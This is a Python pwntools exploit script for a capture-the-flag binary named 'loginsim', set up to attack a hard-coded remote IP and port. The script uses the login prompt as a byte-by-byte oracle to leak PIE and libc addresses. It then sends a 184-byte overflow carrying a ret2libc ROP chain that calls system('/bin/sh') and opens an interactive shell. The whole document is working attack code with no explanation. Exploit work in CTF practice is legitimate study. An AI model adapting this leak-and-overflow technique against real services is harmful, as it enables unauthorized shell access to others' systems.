from pwn import *
import time

# b *getInput+134
# b *getInput+151

gs = '''
continue
'''

elf = context.binary = ELF("./loginsim")
libc = ELF("./glibc/libc.so.6")

def start():
    if args.REMOTE:
        return remote("94.237.58.157", 48542)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def register(longitud, username):
    io.sendlineafter("-> ", b"1")
    io.sendlineafter("{i} Username length: ", str(longitud).encode())
    io.sendlineafter("{i} Enter username: ", username)

def login(username):
    io.sendlineafter("-> ", b"2")
    io.sendlineafter("{i} Username: ", username)

    return "Invalid username! :)" != io.recvline().strip().decode()
        
context.terminal = ['gnome-terminal', '-e']
io = start()

def leak_address(base_force_brute):
    leak = b""

    chars = [bytes([i]) for i in range(256) if i not in {0, 10, 32}]

    for i in range(base_force_brute, base_force_brute + 7):
        register(i + 1, b"A"*i + b" ")
        for char in chars:
            if login(b"A"*i + char):
                leak += char
                print(leak)
                break
    return leak

leak_pie = u64(leak_address(104).ljust(8, b"\x00"))
leak_libc = u64(leak_address(111).ljust(8, b"\x00"))

libc.address = leak_libc - 0x1f0fc8
elf.address = leak_pie - 77 - elf.sym.__libc_csu_init

rop = ROP(libc)

ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]

payload = b"".join([
    b" "*184,
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(ret),
    p64(libc.sym.system)
])

register(128, payload)

io.interactive()
